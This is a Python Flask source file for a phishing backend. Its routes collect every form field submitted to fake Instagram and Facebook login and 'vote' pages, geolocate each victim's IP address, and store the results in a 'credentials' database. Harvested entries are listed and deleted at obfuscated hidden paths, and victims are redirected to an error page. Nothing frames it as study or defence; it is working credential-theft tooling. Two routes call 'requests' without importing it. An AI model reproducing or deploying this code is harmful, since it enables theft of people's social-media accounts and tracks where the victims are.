from flask import Flask, redirect, request, render_template
import os
from datetime import datetime
from json import dumps, loads
import sqlite3
import ipapi


##################### CONFIGURATION ##########################

REDIRECT_URL = 'error'  ## site to redirect to
REDIRECT_URL2 = 'error'  ## site to redirect to
locate = "wwsuobyiyUnvL99f/"
locate2 = "ww7wHFjPBSVisuob/"
view = os.getenv('USER')

###############################################################

# Create a SQLite database file
conn = sqlite3.connect('data.db')
c = conn.cursor()

# Create table if it doesn't exist
c.execute('''CREATE TABLE IF NOT EXISTS credentials
             (id INTEGER PRIMARY KEY, data TEXT, account_type TEXT, ip TEXT, city TEXT, region TEXT, country TEXT, time TEXT)''')
conn.commit()
conn.close()

app = Flask(__name__)


@app.errorhandler(404)
def page_not_found(e):
    return '404 Not Found'


##########################First LG##########################


@app.route('/login/', methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        ip_address = request.headers.get('X-Real-IP',
                                         '127.0.0.1')  # Fallback to localhost IP if 'X-Real-IP' is not available

        alldata = {i + ": ": request.form[i] for i in request.form}
        response = ipapi.location(ip_address)

        alldata.update({
            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
            'account type: ': "INSTAGRAM",
            'ip: ': ip_address,
            "city: ": response.get("city"),
            "region: ": response.get("region"),
            "country: ": response.get("country_name")
        })

        # Insert data into SQLite database
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute("INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (dumps(alldata), "INSTAGRAM", ip_address, response.get("city"), response.get("region"), response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
        conn.commit()
        conn.close()

    return redirect(request.referrer + "error" if request.referrer else "https://artscrednewarts.pages.dev/errors")


@app.route('/login2/', methods=["GET", "POST"])
def login_page2():
    if request.method == "POST":
        ip_address = request.headers.get('X-Real-IP',
                                         '127.0.0.1')  # Fallback to localhost IP if 'X-Real-IP' is not available

        response = ipapi.location(ip_address)

        alldata = {i + ": ": request.form[i] for i in request.form}

        alldata.update({
            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
            'account type: ': "FACEBOOK",
            'ip: ': ip_address,
            "city: ": response.get("city"),
            "region: ": response.get("region"),
            "country: ": response.get("country_name")
        })

        # Insert data into SQLite database
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute("INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (dumps(alldata), "FACEBOOK", ip_address, response.get("city"), response.get("region"), response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
        conn.commit()
        conn.close()

    return redirect(request.referrer + "error" if request.referrer else "https://artscrednewarts.pages.dev/errors")


@app.route("/" + locate)
def index():
    # Fetch data from SQLite database
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("SELECT data FROM credentials WHERE account_type='INSTAGRAM'")
    data = [row[0] for row in c.fetchall()]
    conn.close()

    return render_template('index.html', data=data, loads=loads, locate=locate, view=view)


@app.route("/delete" + locate + "<lineno>")
def delete(lineno):
    # Delete data from SQLite database
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("DELETE FROM credentials WHERE id=?", (lineno,))
    conn.commit()
    conn.close()

    return redirect('https://' + view + '.pythonanywhere.com/' + locate)


##########################Second LG##########################

@app.route('/vote/', methods=["GET", "POST"])
def vote_page():
    if request.method == "POST":
        ip_address = request.headers['X-Real-IP']
        response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()

        alldata = {i + ": ": request.form[i] for i in request.form}

        alldata.update({
            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
            'account type: ': "INSTAGRAM",
            'ip: ': ip_address,
            "city: ": response.get("city"),
            "region: ": response.get("region"),
            "country: ": response.get("country_name")
        })

        # Insert data into SQLite database
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute("INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (dumps(alldata), "INSTAGRAM", ip_address, response.get("city"), response.get("region"), response.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
        conn.commit()
        conn.close()

    return redirect(request.referrer + "error")


@app.route('/vote2/', methods=["GET", "POST"])
def vote_page2():
    if request.method == "POST":
        ip_address2 = request.headers['X-Real-IP']
        response2 = requests.get(f'https://ipapi.co/{ip_address2}/json/').json()

        alldata2 = {i + ": ": request.form[i] for i in request.form}

        alldata2.update({
            'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
            'account type: ': "FACEBOOK",
            'ip: ': ip_address2,
            "city: ": response2.get("city"),
            "region: ": response2.get("region"),
            "country: ": response2.get("country_name")
        })

        # Insert data into SQLite database
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute("INSERT INTO credentials (data, account_type, ip, city, region, country, time) VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (dumps(alldata2), "FACEBOOK", ip_address2, response2.get("city"), response2.get("region"), response2.get("country_name"), datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S")))
        conn.commit()
        conn.close()

    return redirect(request.referrer + "error")


@app.route("/" + locate2)
def index2():
    # Fetch data from SQLite database
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("SELECT data FROM credentials WHERE account_type='FACEBOOK'")
    data2 = [row[0] for row in c.fetchall()]
    conn.close()

    return render_template('index2.html', data=data2, loads=loads, locate2=locate2, view=view)


@app.route("/delete" + locate2 + "<lineno2>")
def delete2(lineno2):
    # Delete data from SQLite database
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("DELETE FROM credentials WHERE id=?", (lineno2,))
    conn.commit()
    conn.close()

    return redirect('https://' + view + '.pythonanywhere.com/' + locate2)


if __name__ == "__main__":
    app.run(debug=True)

